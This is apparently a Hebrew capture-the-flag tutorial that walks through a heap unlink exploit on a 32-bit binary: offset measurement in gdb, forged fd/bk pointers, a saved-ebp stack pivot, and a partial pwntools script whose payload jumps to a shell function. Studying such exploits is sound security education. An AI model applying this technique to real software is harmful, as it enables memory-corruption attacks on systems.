...
נעבור צעד-צעד: קריאת המקור, מדידת ההיסטים ב-gdb, האלגברה של זיוף המטא-דאטה, וה-exploit המלא. הכתובות בפלט הן דוגמה מהרצה מסוימת; שתי הדליפות משתנות בכל הרצה, ולכן ה-exploit קורא אותן דינמית ולא מקבע אותן.
...
typedef struct tagOBJ {
    struct tagOBJ* fd;   // היסט 0
    struct tagOBJ* bk;   // היסט 4
    char buf[8];         // היסט 8
} OBJ;                   // sizeof(OBJ) == 16
```
...
FD = B->fd
BK = B->bk
*(FD + 4) = BK      // FD->bk = BK      (bk בהיסט 4)
*(BK + 0) = FD      // BK->fd = FD      (fd בהיסט 0)
```
...
הגלישה: `gets(A->buf)` כותבת החל מ-`A + 8` (כי `buf` בהיסט 8), בלי הגבלת אורך. השדות `A->fd` ו-`A->bk` נמצאים לפני `buf`, אז לא נוגעים בהם; לעומת זאת קדימה בזיכרון יושב ה-chunk של `B`, ואת ה-`fd` וה-`bk` שלו נוכל לדרוס לגמרי.
...
<<< כאן gdb מחכה ל-gets; מזינים דפוס >>>
```
...
# ב-gdb עוצרים ב-unlink ורואים: FD = B->fd מכיל 4 בתים מהדפוס
```

בבינארי הזה, שלושת ה-chunks בגודל 16 בתים מוקצים רצוף, וה-chunk של `B` יושב 16 בתים אחרי `A->buf`. כלומר:

```text
היסט 0..7   ->  A->buf   (8 בתים)
היסט 8..15  ->  ריפוד עד ל-chunk של B (prev_size + size)
היסט 16..19 ->  B->fd    <-- כאן מתחיל השדה שנשלוט בו
היסט 20..23 ->  B->bk
```

כלומר מ-`cyclic_find(FD)` נקבל 16. שימו לב: המדידה חשובה, כי ההיסט המדויק תלוי ביישור וב-glibc - אל תניחו אותו, וודאו אותו.
...
pwndbg> break unlink
pwndbg> run
pwndbg> p $ebp                 # ה-ebp של unlink = כתובת ה-saved ebp שלו
pwndbg> p &A                   # מהדליפה: הכתובת שהתוכנית הדפיסה
```

מהפרש שתי הכתובות מקבלים את ההיסט. בבינארי הזה יוצא שה-`saved ebp` הרלוונטי נמצא בהיסט קבוע מהדליפה; בדוגמה שלנו נשתמש בכתובת שהתוכנית עצמה כבר נתנה - הדליפה `&A` היא בדיוק מיקום נוח על המחסנית שאליו נכתוב.
...
```text
T = כתובת ה-saved ebp שנדרוס (על המחסנית)
V = כתובת הפריים המזויף ב-heap (בר-כתיבה)
```
...
```text
V = heap + 4          (הפריים המזויף)
V + 4 = heap + 8 = A->buf   -> כאן שותלים p32(shell)
```
...
```text
היסט 0..3   ->  p32(shell)      (נוחת ב-A->buf = heap+8 = V+4)
היסט 4..15  ->  ריפוד (12 בתים)
היסט 16..19 ->  p32(B->fd) = p32(T - 4)
היסט 20..23 ->  p32(B->bk) = p32(V) = p32(heap + 4)
```

מה בעצם קורה בזמן ריצה, שלב-שלב:

```text
1. unlink כותב:  *(T) = V           (saved ebp <- heap+4)
                 *(V) = T - 4        (תופעת לוואי בזיכרון בר-כתיבה, לא קורסת)
2. unlink מבצע leave; ret:
      leave -> ebp <- *(T) = heap+4
      ret   -> חוזר ל-main כרגיל
3. main מסיים ומבצע leave; ret:
      leave -> esp <- ebp = heap+4 ; pop ebp
      ret   -> eip <- *(heap+8) = shell   ->  קופצים ל-shell()!
```
...
def conn():
    if args.REMOTE:
        # לפי עמוד האתגר: הרצה על השרת דרך SSH, או שירות רשת אם קיים
...
shell = elf.symbols['shell']              # כתובת קבועה כי אין PIE
log.info('shell = %#x', shell)

# --- החישוב מתרגיל 3 ---
T = stack                                 # ה-saved ebp שנדרוס (מדוד ב-gdb; כאן הדליפה עצמה)
V = heap + 4                              # הפריים המזויף ב-heap; ret יקרא מ-V+4 = A->buf

BUF_TO_FD = 16                            # נמדד עם cyclic בתרגיל 2

payload  = p32(shell)                     # נוחת ב-A->buf = heap+8 = V+4
payload += b'A' * (BUF_TO_FD - 4)         # ריפוד עד ל-B->fd
payload += p32(T - 4)                     # B->fd = FD  -> כתיבה 1: *(T) = V
...
איך להכליל: זו התבנית של כל ניצול unlink. מזהים מצביעי `fd`/`bk` שנשלטים (גלישה או UAF), הופכים אותם לכתיבה `*(T) = V`, ומכיוון שאסור לכתוב כתובת קוד ישירות - כותבים מצביע לזיכרון שאנחנו שולטים בו, ומנתבים משם עם `leave; ret` או עם דריסת מצביע פונקציה שנקרא בהמשך.
...
int main() {
    // chunks גדולים כדי לעקוף tcache וליפול ל-unsorted bin
    uint8_t *a = malloc(0x420);
    uint8_t *b = malloc(0x420);
    malloc(0x420);                 // מונע מיזוג עם ה-top chunk

    // דריסת המטא-דאטה של b עם fd/bk מזויפים (התקפה קלאסית)
    uint64_t *meta = (uint64_t*)(b - 0x10 + 0x10); // b->fd
    meta[0] = 0x41414141;          // fd מזויף
    meta[1] = 0x42424242;          // bk מזויף

    free(b);                       // מפעיל unlink אמיתי -> הבדיקות רצות
    return 0;
}
```
